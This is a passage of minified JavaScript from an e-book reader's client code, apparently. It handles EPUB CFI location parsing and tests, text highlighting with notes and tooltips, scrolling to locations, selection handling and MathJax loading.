            TestCommand('ParseCFIAssertion("[test^[some^]^^weird^;^(stuff^)^,]/2/3/4[abcd1234]/1:3").assert', "test[some]^weird;(stuff),", e),
            TestCommand('var s = "[test^[some^]^^weird^;^(stuff^)^,]/2/3/4[abcd1234]/1:3"; s.slice(ParseCFIAssertion(s).endOffset)', "/2/3/4[abcd1234]/1:3", e),
            TestCommand('StripCFIAssertions("/2[test^[some^]^^weird^;^(stuff^)^,]/2/3/4[abcd1234]/1:3");', "/2/2/3/4/1:3", e)
        }
        function TestNextNodeRegex(e) {
            var n = CreateNextNodeRegex(),
                o = "/4/2/6[chapter02]/12[sec^[01^]]/2[test^[some^]^^weird^;^(stuff^)^,]/1:3",
                t = function() {
                    var e;
                    if (null != (e = n.exec(o)))
                        switch (e[0].charAt(0)) {
                        case "/":
                            var t = {};
                            return t.targetIndex = parseInt(e[1]), e[2] && (t.id = UnescapeCFIAssertion(e[2])), t;
                        case ":":
                            return {
                                offset: parseInt(e[3])
                            }
                        }
                    return null
                };
            TestCommand({
                test: t,
                title: "testFindNextNode 1"
            }, {
                targetIndex: "4"
            }, e),
            TestCommand({
                test: t,
                title: "testFindNextNode 2"
            }, {
                targetIndex: "2"
            }, e),
            TestCommand({
                test: t,
                title: "testFindNextNode 3"
            }, {
                targetIndex: "6",
                id: "chapter02"
            }, e),
            TestCommand({
                test: t,
                title: "testFindNextNode 4"
            }, {
                targetIndex: "12",
                id: "sec[01]"
            }, e),
            TestCommand({
                test: t,
                title: "testFindNextNode 5"
            }, {
                targetIndex: "2",
                id: "test[some]^weird;(stuff),"
            }, e),
            TestCommand({
                test: t,
                title: "testFindNextNode 6"
            }, {
                targetIndex: "1"
            }, e),
            TestCommand({
                test: t,
                title: "testFindNextNode 7"
            }, {
                offset: "3"
            }, e)
        }
        function RunAutomatedTests() {
            var e = new TestResults;
            TestCFIAssertionUtilities(e),
            TestNextNodeRegex(e);
            var t = e.ResultSummary();
            window.console && window.console.log && window.console.log(t);
            var n = t + "\n" + e.JoinMessages();
            return window.alert(n), 0 == testResults.failCount
        }
        function IEVersion() {
            return /MSIE (\d+\.\d+);/.test(navigator.userAgent) ? document.documentMode ? document.documentMode : new Number(RegExp.$1) : null
        }
        function AdjustClientRect(e) {
            if (!e)
                return null;
            if (8 <= IEVersion()) {
                var t = screen.deviceXDPI / screen.logicalXDPI,
                    n = screen.deviceYDPI / screen.logicalYDPI;
                e.left /= t,
                e.top /= n,
                e.right /= t,
                e.bottom /= n
            }
            return e
        }
        function AdjustClientX() {
            return 8 <= IEVersion() && (x /= screen.deviceXDPI / screen.logicalXDPI), x
        }
        function AdjustClientY(e) {
            return 8 <= IEVersion() && (e /= screen.deviceXDPI / screen.logicalXDPI), e
        }
        function ShowToolTipText(e, t) {
            tooltip || ((tooltip = document.createElement("div")).setAttribute("class", "vstskip"), window.VSTWindowController && window.VSTWindowController.tooltipStyle ? tooltip.setAttribute("style", window.VSTWindowController.tooltipStyle) : tooltip.setAttribute("style", "position:absolute; background:#FFFFAA; box-shadow: 2px 2px 5px #888; width: auto; display:none; font-family:sans-serif; font-size:9pt; padding: 2px; z-index:1000; color:black; font-weight:normal;"), document.body.appendChild(tooltip)),
            tooltip.style.width = "auto",
            tooltip.innerHTML = t;
            var n = e.pageX + 10,
                o = e.pageY + 10;
            tooltip.style.top = o + "px",
            tooltip.style.left = n + "px",
            tooltip.style.display = "block";
            var i = tooltip.offsetWidth;
            250 < i && (tooltip.style.width = "250px", i = 250),
            n + i > document.body.clientWidth && (n = document.body.clientWidth - i, tooltip.style.left = n + "px"),
            currentToolTipGUID = null
        }
        function HideToolTip() {
            tooltip.style.display = "none",
            currentToolTipGUID = null
        }
        function DoShowHighlightToolTip(e, t, n, o) {
            if ((0 < t.length || 0 < n.length) && currentToolTipGUID != o) {
                var i = n.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\r\n/g, "<br/>").replace(/[\n\r]/g, "<br/>"),
                    r = t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\r\n/g, "<br/>").replace(/[\n\r]/g, "<br/>"),
                    a = "";
                0 < i.length && (a = "<b>" + i + "</b>"),
                0 < r.length && (0 < a.length && (a += "<br/>"), a += r),
                ShowToolTipText(e, a),
                currentToolTipGUID = o
            }
        }
        function ShowHighlightToolTip(n, e, o) {
            if (window.VSTWindowController)
                if (window.VSTWindowController.noteTextForGUID) {
                    var t = window.VSTWindowController.noteTextForGUID(o),
                        i = "";
                    window.VSTWindowController.markerInfoForGUID && (i = window.VSTWindowController.markerInfoForGUID(o), window.VSTWindowController.currentMarkerInfo && (i = window.VSTWindowController.currentMarkerInfo)),
                    DoShowHighlightToolTip(n, t, i, o)
                } else
                    window.VSTWindowController.showHighlightToolTipForGUIDAsync && (window.VSTWindowController.showHighlightToolTipForGUIDCallback = function(e, t) {
                        DoShowHighlightToolTip(n, e, t, o)
                    }, window.VSTWindowController.showHighlightToolTipForGUIDAsync(o))
        }
        function HideHighlightToolTip(e, t) {
            currentToolTipGUID == t && HideToolTip()
        }
        function FindDocumentRoot(e) {
            for (var t = e.firstChild; null != t && 1 != t.nodeType;)
                t = t.nextSibling;
            return t
        }
        function CFILocation(e, t, n) {
            this.node = e,
            this.document = t,
            n && (this.offset = n),
            this.afterNode = !1
        }
        function InitFirstBodyNode() {
            sOriginalFirstBodyNode || (sOriginalFirstBodyNode = document.body.firstChild)
        }
        function DontHighlightMathML() {
            sDontHighlightMathML = !0
        }
        function NodeHasClass(e, t) {
            if (e.className) {
                var n = t ? new RegExp("\\b" + t + "\\b") : null;
                return e.className.baseVal ? n.test(e.className.baseVal) : n.test(e.className)
            }
            return !1
        }
        function NodeIsHighlightSpan(e) {
            return e && 1 == e.nodeType && NodeHasClass(e, "vstignore")
        }
        function NodeShouldBeSkipped(e) {
            if (e && 1 == e.nodeType) {
                if (NodeHasClass(e, "vstskip"))
                    return !0;
                if (NodeHasClass(e, "vstignore") && !e.hasChildNodes())
                    return !0
            }
            return !1
        }
        function NodeChildrenShouldBeSkipped(e) {
            if (e && 1 == e.nodeType) {
                if (NodeHasClass(e, "vstdonthighlight"))
                    return !0;
                if (sDontHighlightMathML) {
                    if ("http://www.w3.org/1998/Math/MathML" == e.namespaceURI && "math" == e.localName)
                        return !0;
                    if ("http://www.w3.org/2000/svg" == e.namespaceURI && "svg" == e.localName)
                        return !0;
                    if (NodeHasClass(e, "MathJax"))
                        return !0
                }
            }
            return !1
        }
        function IsNodeInSkippedSubtree(e, t) {
            for (var n = e; n;) {
                if (NodeShouldBeSkipped(n))
                    return !0;
                if (n != e && NodeChildrenShouldBeSkipped(e))
                    return !0;
                if (t)
                    return t(e);
                n = n.parentNode
            }
            return !1
        }
        function FindFirstLegalAncestor(e) {
            for (var t = e, n = e, o = !1; n;)
                NodeShouldBeSkipped(n) ? o = !0 : NodeChildrenShouldBeSkipped(n) ? (t = n, o = !1) : o && 9 != n.nodeType && (t = n, o = !1),
                n = n.parentNode;
            return o && (t = null), t
        }
        function CFIDOMWalker(e, t, n) {
            n || (n = e.ownerDocument),
            this.Initialize(e, t, n)
        }
        function CreateCFIDOMWalkerForChildren(e, t) {
            var n = new CFIDOMWalker(e, 0, t);
            return null == n.node ? null : (n.WalkChildren(), n)
        }
        function FindParentNode(e) {
            for (var t = e.parentNode; t && NodeIsHighlightSpan(t);)
                t = t.parentNode;
            return t && 9 == t.nodeType && (t = null), t
        }
        function IsTextNode(e) {
            if (!e)
                return !1;
            var t = e.nodeType;
            return 3 === t || 4 === t || 5 === t
        }
        function walkCFISubpath(e, t, n) {
            for (var o, i = CreateNextNodeRegex(); null != (o = i.exec(t));) {
                var r = e.node,
                    a = e.document;
                switch (o[0].charAt(0)) {
                case "/":
                    var s = parseInt(o[1]),
                        l = null,
                        c = null;
                    if (e.WalkChildren(), e.FindNodeAtIndex(s), o[2] && (l = UnescapeCFIAssertion(o[2]), c = a.getElementById(l), e.node !== c && (e.node = c)))
                        break;
                    if (e.index != s || !e.node) {
                        var u = i.lastIndex,
                            d = !0;
                        null != (o = i.exec(t)) && (d = !1);
                        var f = new CFILocation(r, a);
                        if (e.node ? s < e.index && (f.node = e.node) : (s != e.index + 1 && (d = !1), f.afterNode = !0), !d) {
                            for (var h = 0; h < u; ++h)
                                " ";
                            f.error = "child not found: " + t
                        }
                        return f
                    }
                    break;
                case "!":
                    if (!e.WalkContentDocumentChildren())
                        return (f = new CFILocation(r, a)).error = "iframe reference child not found: " + t, f;
                    break;
                case ":":
                    if (e.CurrentNodeIsText()) {
                        var p = parseInt(o[3]);
                        return (f = e.FindNodeAtOffset(p, n)) || (logError("Could not find offset " + p + " in cfi " + t), (f = new CFILocation(r, a)).error = "Could not find offset " + p + " in cfi " + t), f
                    }
                    break;
                case "@":
                    return (f = new CFILocation(e.node, e.document)).posX = parseFloat(o[4]), f.posY = parseFloat(o[5]), f;
                default:
                    logError("programming error - unknown match " + o[0] + " in " + t)
                }
            }
            return f = new CFILocation(e.node, e.document)
        }
        function locateCFISubpathFromNode(e, t, n) {
            return walkCFISubpath(new CFIDOMWalker(t, 0, n), e, n)
        }
        function locateCFI(e) {
            var t = FindDocumentRoot(document);
            return t ? locateCFISubpathFromNode(e, t, document) : (logError("Error- no root node"), null)
        }
        function ScrollToLocation(e, t) {
            var n = t || VST.scrollElement;
            if (e.node) {
                var o = e.node,
                    i = o.ownerDocument;
                if (!i)
                    return null;
                var r = i.defaultView || i.parentWindow,
                    a = null;
                if (null != e.offset || 1 != o.nodeType) {
                    var s = i.createRange(),
                        l = 0;
                    null != e.offset && (l = e.offset),
                    0 < l && 0 < o.nodeValue.length && l >= o.nodeValue.length && (l = o.nodeValue.length - 1),
                    s.setStart(o, l),
                    s.setEnd(o, Math.max(0, Math.min(o.nodeValue.length - 1, l + 1))),
                    0 < (c = s.getClientRects()).length && (a = AdjustClientRect(c[0]))
                }
                for (; !a && o;) {
                    var c;
                    if (null != o.getClientRects)
                        0 < (c = o.getClientRects()).length && (a = AdjustClientRect(c[0]));
                    a || (o = o.parentNode)
                }
                if (a) {
                    var u = a.left + r.pageXOffset,
                        d = a.top + r.pageYOffset;
                    null != e.posX && (u += e.posX),
                    null != e.posY && (d += e.posY),
                    t ? t.scrollTo ? t.scrollTo(u, d) : (t.scrollTop = d, t.scrollLeft = u) : n.scrollTo ? n.scrollTo(u, d) : (n.scrollTop = d, n.scrollLeft = u);
                    try {
                        if (!VST.scrollElement.nodeName)
                            for (; r && r != n;) {
                                var f = r.parent,
                                    h = r.frameElement;
                                if (!f || !h)
                                    break;
                                var p = h.getBoundingClientRect();
                                p = AdjustClientRect(p),
                                u -= r.pageXOffset,
                                d -= r.pageYOffset,
                                u += p.left + f.pageXOffset,
                                d += p.top + f.pageYOffset,
                                f.scrollTo(u, d),
                                r = f
                            }
                    } catch (g) {
                        VST.Logger.debug("exception caught when scrolling", g)
                    }
                }
            }
        }
        function ScrollToCFI(e, t, n, o) {
            if (o = void 0 === o || o, sScrollToCFIPaused) {
                var i = e,
                    r = n || VST.scrollElement;
                return VST.Logger.info("Saving CFI " + i + " to scroll later"), sSavedCFIScroll = function() {
                    VST.Logger.info("resuming scrolling, scrolling to " + i),
                    ScrollToCFI(i, null, r)
                }, void (t && sCFIScrollCompletion.push(t))
            }
            var a = locateCFI(e);
            if (a) {
                ScrollToLocation(a, n);
                var s = a.node;
                s && (IsTextNode(s) && (s = s.parentNode), s && s.setAttribute && s.focus && (s.getAttribute("tabindex") || (s.setAttribute("tabindex", "0"), setTimeout(function() {
                    s.removeAttribute("tabindex")
                }, 2500)), o && s.focus()))
            }
            t && t()
        }
        function PauseScrollToCFI() {
            VST.Logger.info("pausing scroll to CFI"),
            sScrollToCFIPaused = !0
        }
        function ResumeScrollToCFI() {
            if (sScrollToCFIPaused && (sScrollToCFIPaused = !1, sSavedCFIScroll && (sSavedCFIScroll(), sSavedCFIScroll = null, 0 < sCFIScrollCompletion.length))) {
                var e,
                    t = sCFIScrollCompletion.length;
                for (e = 0; e < t; ++e)
                    sCFIScrollCompletion[e]();
                sCFIScrollCompletion = new Array
            }
        }
        function NodeStackForLocation(e, t) {
            if (!t || !t.node || t.error)
                return null;
            var n = new Array;
            if (n.push(t), t.node != e)
                for (var o = t.node.parentNode, i = t.document; null != o && o != e;) {
                    var r = new CFILocation(o, i);
                    n.push(r),
                    o = o.parentNode
                }
            return n
        }
        function FindHighlightGUIDInClassString(e) {
            var t;
            return null != (t = e.match(/\bhighlight_([^\ ]+)\b/)) ? t[1] : null
        }
        function CreateHighlightSpan(e, t, n, o) {
            var i = e.createElement("span");
            if (o ? i.setAttribute("style", "border-bottom: #949494 2px dashed") : i.setAttribute("style", "background-color:" + t), n && 0 < n.length) {
                i.className = "vsthighlight vstignore " + n;
                var r = FindHighlightGUIDInClassString(n);
                r && (i.onmouseover = function(e) {
                    ShowHighlightToolTip(e, this, r)
                }, i.onmouseout = function() {
                    HideHighlightToolTip(this, r)
                })
            } else
                i.className = "vsthighlight vstignore";
            return i
        }
        function CreateNoteSpan(e, t, n) {
            var o = e.createElement("span");
            return o.className = "vstnoteindicator vstskip " + n, o
        }
        function SplitTextLocation(e) {
            if (e && 1 != e.node.nodeType && null != e.offset && 0 < e.offset) {
                for (var t = e.offset, n = e.node, o = n.nodeValue, i = e.document; t >= o.length;) {
                    do {
                        var r = n;
                        if (!(n = n.nextSibling))
                            return (a = new CFILocation(r, i)).afterNode = !0, a;
                        if (1 == n.nodeType)
                            return a = new CFILocation(n, i, 0)
                    } while (n.nodeType < 3 || 5 < n.nodeType);
                    t -= o.length,
                    o = n.nodeValue
                }
                var a,
                    s = n.parentNode,
                    l = o.slice(0, t),
                    c = o.slice(t),
                    u = i.createTextNode(c);
                return s.insertBefore(u, n.nextSibling), n.nodeValue = l, a = new CFILocation(n = u, i, 0)
            }
            return e
        }
        function AllowHighlightingSpanInNode(e) {
            var t,
                n = !0;
            "http://www.w3.org/1998/Math/MathML" == e.namespaceURI ? "mtext" != (t = e.localName) && "mi" != t && "mn" != t && "mo" != t && (n = !1) : ("table" == (t = (t = e.localName || e.nodeName).toLowerCase()) || "tr" == t || "thead" == t || "tbody" == t || "tfoot" == t || "colgroup" == t || "col" == t) && (n = !1);
            return n
        }
        function DoCreateHighlightsInNodeRange(e, t, n, o, i, r, a, s) {
            if (!IsNodeInSkippedSubtree(n))
                for (var l = null, c = e, u = a, d = AllowHighlightingSpanInNode(n); c != t && null != c;) {
                    var f = c.nextSibling;
                    if (1 == c.nodeType)
                        l = null,
                        DoCreateHighlightsInNodeRange(c.firstChild, null, c, o, i, r);
                    else if (d && 3 <= c.nodeType && c.nodeType <= 5) {
                        if (null == l && 0 < c.nodeValue.length && (l = CreateHighlightSpan(o, i, r, s), "transparent" === i && l.setAttribute("style", "border-bottom:  #949494 2px dashed"), n.insertBefore(l, c), u)) {
                            if (s) {
                                var h = o.createElement("span"),
                                    p = ["background: #fff", "position: absolute", "right: -10px", "border-radius: 100%", "border: 1px solid #ECECEC", "box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.2)", "width: 48px", "height: 48px", "line-height: 48px", "text-align: center", "margin-top: -20px", "font-family: Segoe UI Emoji"];
                                h.setAttribute("style", p.join("; ")),
                                h.setAttribute("class", VST.Models.Highlight.Settings.emojiWrapperClass + " " + r);
                                var g = o.createElement("span");
                                g.innerHTML = s,
                                g.setAttribute("class", VST.Models.Highlight.Settings.highlightClass);
                                var m = ["font-size: 26px", "line-height: 55px", "text-indent: 0px", "text-decoration: none", "display: block", "font-style: normal", "user-select: none"];
                                g.setAttribute("style", m.join("; ")),
                                h.appendChild(g),
                                n.insertBefore(h, l)
                            } else {
                                var v = noteIconHandler(o, i, r);
                                n.insertBefore(v, l)
                            }
                            u = !1
                        }
                        l && (l.appendChild(c), c == sOriginalFirstBodyNode && (sOriginalFirstBodyNode = l))
                    }
                    c = f
                }
        }
        function HighlightDOMLocationStacks(e, t, n, o, i, r) {
            var a = e && 0 < e.length ? e.pop() : null,
                s = t && 0 < t.length ? t.pop() : null;
            if (a || s) {
                var l = a ? a.document : s.document,
                    c = a ? a.node : null,
                    u = s ? s.node : null,
                    d = c ? c.parentNode : u.parentNode;
                if (!d)
                    return void logError("HighlightDOMLocationStacks- parent node is null");
                if (!IsNodeInSkippedSubtree(d)) {
                    var f = e && 0 < e.length ? e : null,
                        h = t && 0 < t.length ? t : null;
                    a = SplitTextLocation(a),
                    s = SplitTextLocation(s);
                    c = null,
                    u = null;
                    if (!a || (c = a.node, !a.afterNode || (c && (c = c.nextSibling), c))) {
                        if (s && ((u = s.node) && s.afterNode && (u = u.nextSibling)), c || (c = d.firstChild), !c && !u)
                            return void logError("HighlightDOMLocationStacks- beginNode and endNode are both null");
                        if (c == u)
                            (f || h) && HighlightDOMLocationStacks(f, h, n, o, i, r);
                        else {
                            var p = c;
                            f && (p = p.nextSibling),
                            DoCreateHighlightsInNodeRange(p, u, d, l, n, o, i && !f, r),
                            f && HighlightDOMLocationStacks(f, null, n, o, i, r),
                            h && HighlightDOMLocationStacks(null, h, n, o, !1)
                        }
                    }
                }
            }
        }
        function CFIRangeNode(e, t, n, o, i, r, a) {
            this.basePath = e.split("!").reverse()[0],
            this.begin = t,
            this.end = n,
            this.color = o,
            this.additionalClass = i,
            this.hasNote = r,
            this.emoji = a
        }
        function exitContentRange() {
            VST.contentRangeBundle && (VST.contentRangeBundle.map(function(e) {
                try {
                    e && e.show()
                } catch (t) {}
            }), VST.contentRangeBundle = [])
        }
        function CFIRangeTreeNode(e, t) {
            this.basePath = e,
            this.children = t
        }
        function TestHighlightCFIRange(e, t, n, o, i, r) {
            o || (o = "yellow"),
            new CFIRangeNode(e, t, n, o, i, r).Highlight(FindDocumentRoot(document), document)
        }
        function UnhighlightAll(e) {
            function t(e, t) {
                var n,
                    o = document.getElementsByClassName(e),
                    i = o.length;
                for (n = 0; n < i; ++n) {
                    var r = o[n];
                    r && r.className && ("vsthighlight tombstone vstignore" == r.className || t && !NodeHasClass(r, t) || (r.removeAttribute("style"), r.className = "vsthighlight tombstone vstignore"))
                }
            }
            t("vsthighlight", e),
            t("vstnoteindicator", e)
        }
        function BuildHighlightRangeTreeLevel(e, t, n, o) {
            var i,
                r = new Array,
                a = t.length;
            for (i = 0; i < a; ++i) {
                var s = t[i];
                if ("string" == typeof s)
                    ;
                else {
                    var l = s.base,
                        c = s.color ? s.color : n,
                        u = s.additionalClass ? s.additionalClass : o;
                    if (null != s.children) {
                        var d = BuildHighlightRangeTreeLevel(l, s.children, c, u);
                        r.push(d)
                    } else {
                        d = new CFIRangeNode(l, s.begin, s.end, c, u, s.hasNote, s.emoji);
                        r.push(d)
                    }
                }
            }
            return new CFIRangeTreeNode(e, r)
        }
        function BuildHighlightRangeTree(e, t, n) {
            return BuildHighlightRangeTreeLevel("", e, t, n)
        }
        function HighlightRanges(e, t, n, o) {
            var i = BuildHighlightRangeTree(e, t, n),
                r = o || document;
            i.Highlight(FindDocumentRoot(r), r)
        }
        function TestHighlightRanges() {
            HighlightRanges([{
                base: "/4/2/30/2/1",
                begin: ":3",
                end: ":10"
            }, {
                base: "/4/2/30/4/1",
                begin: ":0",
                end: ":5",
                hasNote: !0
            }], "yellow", "search"),
            HighlightRanges([{
                base: "/4/2/32",
                children: [{
                    base: "/2",
                    begin: "/1:0",
                    end: "/1:10",
                    hasNote: !0
                }, {
                    base: "/4",
                    begin: "/1:10",
                    end: "/1:16",
                    color: "red",
                    hasNote: !0
                }],
                color: "yellowgreen"
            }, {
                base: "/4/2/34",
                begin: "/2/1:0",
                end: "/2/1:3",
                hasNote: !0
            }], "lightblue", "other")
        }
        function HideElement(e) {
            var t = document.createElement("div");
            e.parentNode.insertBefore(t, e),
            t.appendChild(e),
            t.setAttribute("style", "display:none"),
            t.className = "vstignore"
        }
        function ProcessEPUBSwitches(e) {
            var t,
                n = {},
                o = e.length;
            for (t = 0; t < o; ++t)
                n[e[t]] = !0;
            var i,
                r = document.getElementsByTagNameNS("http://www.idpf.org/2007/ops", "switch"),
                a = r.length;
            for (i = 0; i < a; ++i)
                for (var s = r[i].firstChild, l = !1; s;) {
                    if ("http://www.idpf.org/2007/ops" == s.namespaceURI)
                        if ("case" == s.localName)
                            if (l)
                                HideElement(s);
                            else {
                                var c = s.getAttribute("required-namespace");
                                0 < c.length && n[c] && (l = !0),
                                l || HideElement(s)
                            }
                        else
                            "default" == s.localName && l && HideElement(s);
                    s = s.nextSibling
                }
        }
        function BeginMathJaxLayout() {
            PauseScrollToCFI()
        }
        function EndMathJaxLayout() {
            if (!sSavedCFIScroll) {
                var e = window.location.hash;
                if (e && ("#" == e.charAt(0) && (e = e.slice(1)), 0 < e.length && !/^epubcfi/.test(e))) {
                    var t = document.getElementById(e);
                    if (!t) {
                        var n = document.getElementsByName(e);
                        0 < n.length && (t = n[0])
                    }
                    if (t)
                        ScrollToLocation(new CFILocation(t, document))
                }
            }
            ResumeScrollToCFI()
        }
        function LoadMathJax(e, t) {
            if (0 != document.getElementsByTagNameNS("http://www.w3.org/1998/Math/MathML", "math").length) {
                InitFirstBodyNode(),
                DontHighlightMathML(),
                null == t && (t = "VSTEPUBModule.ConfigMathJax(); MathJax.Hub.Startup.onload();");
                var n = document.createElement("script");
                n.type = "text/x-mathjax-config",
                window.opera ? n.innerHTML = t : n.text = t;
                var o = document.createElement("script");
                o.type = "text/javascript",
                o.src = e;
                var i = document.getElementsByTagName("head")[0];
                i.appendChild(n),
                i.appendChild(o),
                BeginMathJaxLayout()
            }
        }
        function ConfigMathJax() {
            MathJax.Ajax.config.path.a11y = "https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/extensions/a11y",
            MathJax.Hub.Config({
                jax: ["input/TeX", "input/MathML", "input/AsciiMath", "output/CommonHTML"],
                extensions: ["tex2jax.js", "mml2jax.js", "asciimath2jax.js", "MathMenu.js", "MathZoom.js", "AssistiveMML.js"],
                TeX: {
                    extensions: ["AMSmath.js", "AMSsymbols.js", "noErrors.js", "noUndefined.js"]
                },
                showMathMenu: !1
            }),
            MathJax.Hub.Register.StartupHook("End Typeset", function() {
                EndMathJaxLayout()
            })
        }
        function GetCFIForNode(e, t, n) {
            for (var o = "", i = e; NodeIsHighlightSpan(i);)
                i = FindParentNode(i);
            for (; i;) {
                var r = FindParentNode(i);
                if (r) {
                    var a = CreateCFIDOMWalkerForChildren(r);
                    if (!a)
                        break;
                    for (var s = 0;;) {
                        if (a.node == i) {
                            var l = a.index,
                                c = "";
                            if (n)
                                ++l,
                                n = !1;
                            else {
                                if (a.CurrentNodeIsText()) {
                                    if (0 < o.length)
                                        return logError("Error: found text node not at the root of a CFI"), null;
                                    o = "/" + l + ":" + (s += t);
                                    break
                                }
                                if (a.node.getAttribute) {
                                    var u = a.node.getAttribute("id");
                                    u && 0 < u.length && (c = "[" + EscapeCFIAssertion(u) + "]")
                                }
                            }
                            o = "/" + l + c + o;
                            break
                        }
                        if (a.CurrentNodeIsText() ? s += a.node.nodeValue.length : a.CurrentNodeIsElement() && (s = 0), null == a.NextNode())
                            return logError("Error: Node " + i + " not found. Partial CFI found: " + o), null
                    }
                }
                i = r
            }
            return o
        }
        function InterpretRangeEndpoint(e, t, n) {
            var o = !1,
                i = 0,
                r = {};
            if (0 < t)
                switch (e.nodeType) {
                case 1:
                    t < e.childNodes.length ? e = e.childNodes[t] : 0 < e.childNodes.length && (e = e.childNodes[e.childNodes.length - 1], o = !0);
                    break;
                case 3:
                case 4:
                case 5:
                    i = t
                }
            var a = FindFirstLegalAncestor(e);
            return a != e && (r.legalAncestor = a, r.originalNode = e, e = a, i = 0, o = !n), r.node = e, r.textOffset = i, r.afterNode = o, r
        }
        function GetCFIForRangeEndpoint(e, t, n) {
            var o = InterpretRangeEndpoint(e, t, n);
            return GetCFIForNode(o.node, o.textOffset, o.afterNode)
        }
        function IsLegalHighlightRange(e) {
            if (e.collapsed)
                return !1;
            var t = InterpretRangeEndpoint(e.startContainer, e.startOffset, !1),
                n = InterpretRangeEndpoint(e.endContainer, e.endOffset, !0);
            return !(t.legalAncestor && n.legalAncestor && t.legalAncestor == n.legalAncestor)
        }
        function HasHighlightableSelection() {
            if (window.getSelection) {
                var e = window.getSelection();
                if (e && 0 < e.rangeCount)
                    if (t = e.getRangeAt(0))
                        return IsLegalHighlightRange(t)
            } else if (document.selection) {
                var t;
                if (t = document.selection.createRange()) {
                    var n = getTextRangeStartContainer(t),
                        o = getTextRangeEndContainer(t);
                    return t.startContainer = n.container, t.startOffset = n.offset, t.endContainer = o.container, t.endOffset = o.offset, IsLegalHighlightRange(t)
                }
            }
            return !1
        }
        function FindRangeWithCommonBase(e, t) {
            for (var n = CreateNextNodeRegex(), o = CreateNextNodeRegex(), i = 0, r = 0;;) {
                var a = n.exec(e),
                    s = o.exec(t),
                    l = !1;
                if (a && s && a[0] == s[0] && (l = !0), !l)
                    return {
                        base: e.slice(0, i),
                        begin: e.slice(i),
                        end: t.slice(r)
                    };
                i = n.lastIndex,
                r = o.lastIndex
            }
            return {
                base: e,
                begin: "",
                end: ""
            }
        }
        function GetCFIRangeForSelection(e) {
            var t = null,
                n = e || VST.window;
            if (n.getSelection) {
                var o = n.getSelection();
                if (o && 0 < o.rangeCount)
                    if ((i = o.getRangeAt(0)) && IsLegalHighlightRange(i))
                        t = FindRangeWithCommonBase(GetCFIForRangeEndpoint(i.startContainer, i.startOffset, !1), GetCFIForRangeEndpoint(i.endContainer, i.endOffset, !0))
            } else if (n.document.selection) {
                var i;
                if (i = n.document.selection.createRange()) {
                    var r = getTextRangeStartContainer(i),
                        a = getTextRangeEndContainer(i);
                    t = FindRangeWithCommonBase((i.parentElement().innerText.indexOf(i.text), GetCFIForRangeEndpoint(r.container, r.offset, !1)), GetCFIForRangeEndpoint(a.container, a.offset, !0))
                }
            }
            return t
        }
        function getTextRangeStartContainer(e) {
            var t = e.duplicate(),
                n = e.duplicate();
            t.collapse(!0),
            t.moveEnd("character", 1);
            var o = t.parentElement();
            n.moveToElementText(o),
            n.setEndPoint("EndToEnd", t);
            for (var i = n.text, r = null, a = n.text.length, s = o.firstChild; s; s = s.nextSibling)
                if (3 == s.nodeType) {
                    var l = s.nodeValue;
                    if (0 != i.indexOf(l) || i == l) {
                        r = s;
                        break
                    }
                    i = i.substring(l.length),
                    a -= l.length
                } else
                    a -= s.innerText.length;
            return {
                container: r,
                offset: a - 1
            }
        }
        function getTextRangeEndContainer(e) {
            var t = e.duplicate(),
                n = e.duplicate();
            t.collapse(!1),
            t.moveStart("character", t.text.length);
            var o = t.parentElement();
            return n.moveToElementText(o), n.setEndPoint("StartToStart", t), getTextRangeStartContainer(n)
        }
        function IsPointInHighlightableSelectedText(e, t) {
            if (window.getSelection) {
                var n = window.getSelection();
                if (n && 0 < n.rangeCount)
                    if ((s = n.getRangeAt(0)) && IsLegalHighlightRange(s)) {
                        var o,
                            i = s.getClientRects(),
                            r = i.length;
                        for (o = 0; o < r; ++o) {
                            var a = AdjustClientRect(i.item(o));
                            if (e >= a.left && e <= a.right && t >= a.top && t <= a.bottom)
                                return !0
                        }
                    }
            } else if (document.selection)
                var s = document.selection.createRange();
            return !1
        }
        function ClearSelection() {
            if (window.getSelection) {
                var e = window.getSelection();
                e && e.removeAllRanges()
            } else
                document.selection && document.selection.empty()
        }
        function TestHighlightSelection(e) {
            var t = GetCFIRangeForSelection();
            e || (e = "lightblue"),
            logMessage("Highlighting (" + t.base + ", " + t.begin + ", " + t.end + ")"),
            HighlightRanges([t], e, "test"),
            ClearSelection()
        }
        function GetCFIRangeStringForSelection() {
            var e = GetCFIRangeForSelection();
            return e ? e.base + "," + e.begin + "," + e.end : ""
        }
        function GetSelectionText() {
            if (window.getSelection) {
                var e = window.getSelection();
                if (e)
                    return e.toString()
            } else
                document.selection;
            return ""
        }
        function GetSpeechText() {
            function a(e) {
                var t = "";
                if (e.getSelection) {
                    var n = e.getSelection();
                    if (n && (t = n.toString()), 0 == t.length) {
                        var o = e.frames;
                        if (o) {
                            var i,
                                r = o.length;
                            for (i = 0; i < r && 0 == (t = a(o[i])).length; ++i)
                                ;
                        }
                    }
                } else
                    document.selection;
                return t
            }
            var e = a(window);
            return 0 == e.length && VST && VST.Utils && (e = VST.Utils.getElementText(document.body)), e
        }
        function HighlightGUIDForNode(e) {
            for (var t = e; t;) {
                if (1 == e.nodeType) {
                    var n = FindHighlightGUIDInClassString(e.className);
                    if (n)
                        return n
                }
                t = t.parentNode
            }
            return null
        }
        function HighlightGUIDForPoint(e, t) {
            return HighlightGUIDForNode(document.elementFromPoint(e, t))
        }
        function FindDOMNodeAndOffsetIntersectingViewportRect(e, t, n, o) {
            function r(e, t) {
                return Math.max(e.top, t.top) < Math.min(e.bottom, t.bottom) && Math.max(e.left, t.left) < Math.min(e.right, t.right)
            }
            function a(e, t) {
                var n,
                    o = e.getClientRects(),
                    i = o.length;
                for (n = 0; n < i; ++n)
                    if (r(AdjustClientRect(o[n]), t))
                        return !0;
                return !1
            }
            function i(e, t) {
                var n = VST.Utils.getRangeObject();
                if (!n || !n.setStart)
                    return null;
                var o = 0,
                    i = e.length;
                if (n.setStart(e, 0), n.setEnd(e, i), !a(n, t))
                    return null;
                for (o = 0; o < i; ++o)
                    if (n.setStart(e, o), n.setEnd(e, o + 1), a(n, t))
                        return {
                            node: e,
                            offset: o
                        };
                return null
            }
            function s(e, t) {
                var n = ((e.left - t.left) / (t.right - t.left) * 100).toPrecision(3),
                    o = ((e.top - t.top) / (t.bottom - t.top) * 100).toPrecision(3);
